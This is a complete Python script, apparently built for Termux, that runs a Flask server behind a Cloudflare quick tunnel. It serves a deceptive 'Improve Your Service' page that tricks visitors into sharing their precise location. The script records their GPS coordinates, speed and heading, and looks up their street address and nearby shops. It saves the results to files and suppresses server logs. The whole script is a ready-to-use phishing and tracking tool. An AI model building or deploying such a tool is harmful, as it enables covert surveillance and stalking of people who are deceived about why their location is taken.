import os
import sys
import json
import subprocess
import re
import logging
import time
from threading import Thread
from datetime import datetime

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] Failed to install {package}: {e}", file=sys.stderr)
        sys.exit(1)

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port):
    """Starts a cloudflared tunnel and prints only the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"\nPublic Link: {match.group(0)}\n")
            sys.stdout.flush()
            break
    process.wait()

# --- Imports for Flask App (after dependency check) ---
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- CONFIGURATION ---

LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/Locations')
os.makedirs(LOCATION_FOLDER, exist_ok=True)

logger = logging.getLogger(__name__)
logger.setLevel(logging.ERROR)  # Suppress INFO logs in terminal

# --- HELPER FUNCTIONS & BACKGROUND PROCESSING ---

geolocator = Nominatim(user_agent="fast_location_app")

def process_and_save_location(data):
    """Background process: enrich and save location data."""
    try:
        lat, lon = data['latitude'], data['longitude']
        full_data = {'gps_data': data}

        # 1. Reverse Geocode
        try:
            location = geolocator.reverse((lat, lon), language='en', exactly_one=True, timeout=10)
            if location and hasattr(location, 'raw') and 'address' in location.raw:
                full_data['address_details'] = location.raw.get('address', {})
                full_data['full_address'] = location.address
        except Exception:
            full_data['full_address'] = "N/A"

        # 2. Nearby Stores
        full_data['nearby_stores'] = get_nearby_stores(lat, lon)

        # 3. IP Location
        full_data['ip_based_location'] = get_ip_info()

        # 4. Save JSON
        date_str = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = os.path.join(LOCATION_FOLDER, f'location_{date_str}.json')
        with open(filename, 'w') as f:
            json.dump(full_data, f, indent=4)

        # Print only file path
        print(f"Data saved: {filename}\n")

    except Exception as e:
        logger.error(f"Error in background processing: {e}")

def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_stores(latitude, longitude, radius=2000):
    overpass_query = f"""[out:json];(node["shop"](around:{radius},{latitude},{longitude});way["shop"](around:{radius},{latitude},{longitude}););out body;"""
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        return [element['tags']['name'] for element in elements if 'tags' in element and 'name' in element['tags']]
    except requests.RequestException:
        return []

# --- FLASK APPLICATION ---

app = Flask(__name__)

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Location Access</title>
<style>
    body{margin:0;padding:20px;background-color:#121212;color:#E0E0E0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;text-align:center}
    .container{max-width:600px}h1{color:#0d6efd;font-size:2.5rem;margin-bottom:1rem}
    p{margin-bottom:2rem;font-size:1.1rem;line-height:1.6;color:#b0b3b8}
    button{padding:15px 30px;background-color:#0d6efd;color:white;border:none;border-radius:8px;cursor:pointer;font-size:1.2rem;font-weight:600;transition:background-color .2s ease,transform .2s ease;box-shadow:0 4px 15px rgba(13,110,253,.4)}
    button:hover{background-color:#0b5ed7;transform:translateY(-2px)}
    button:disabled{background-color:#555;cursor:not-allowed;transform:none;box-shadow:none}
    #status{margin-top:1.5rem;font-size:1rem;height:20px;transition:color .3s ease}
</style>
</head>
<body>
<div class="container">
    <h1>Improve Your Service</h1>
    <p>To enhance service quality and provide localized content, our application requires access to your location.</p>
    <button id="locationButton" onclick="requestLocation()">Share Location</button>
    <div id="status"></div>
</div>
<script>
    const statusEl = document.getElementById('status');
    const buttonEl = document.getElementById('locationButton');
    async function sendLocationToServer(position) {
        const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude,
            speed: position.coords.speed,
            heading: position.coords.heading
        };
        fetch('/save_location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(locationData)
        });
    }
    async function requestLocation() {
        buttonEl.disabled = true;
        statusEl.style.color = '#ffc107';
        statusEl.textContent = 'Requesting location...';
        if (!navigator.geolocation) {
            statusEl.style.color = '#dc3545';
            statusEl.textContent = 'Geolocation is not supported.';
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (fastPosition) => {
                statusEl.style.color = '#28a745';
                statusEl.textContent = 'Location received. Improving accuracy...';
                sendLocationToServer(fastPosition);
                navigator.geolocation.getCurrentPosition(
                    (accuratePosition) => {
                        statusEl.textContent = 'Accuracy improved!';
                        sendLocationToServer(accuratePosition);
                        buttonEl.disabled = false;
                    },
                    () => {
                        statusEl.textContent = 'Initial location saved.';
                        buttonEl.disabled = false;
                    },
                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                );
            },
            (err) => {
                statusEl.style.color = '#dc3545';
                statusEl.textContent = `Error: ${err.message}`;
                buttonEl.disabled = false;
            },
            { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
        );
    }
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save_location', methods=['POST'])
def save_location():
    data = request.get_json(force=True)
    if not data or 'latitude' not in data:
        return jsonify({"error": "Invalid location data."}), 400

    processing_thread = Thread(target=process_and_save_location, args=(data,))
    processing_thread.daemon = True
    processing_thread.start()
    return jsonify({"message": "Location data received."}), 202

# --- MAIN EXECUTION ---

if __name__ == '__main__':
    check_dependencies()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {e}")
        sys.exit(1)

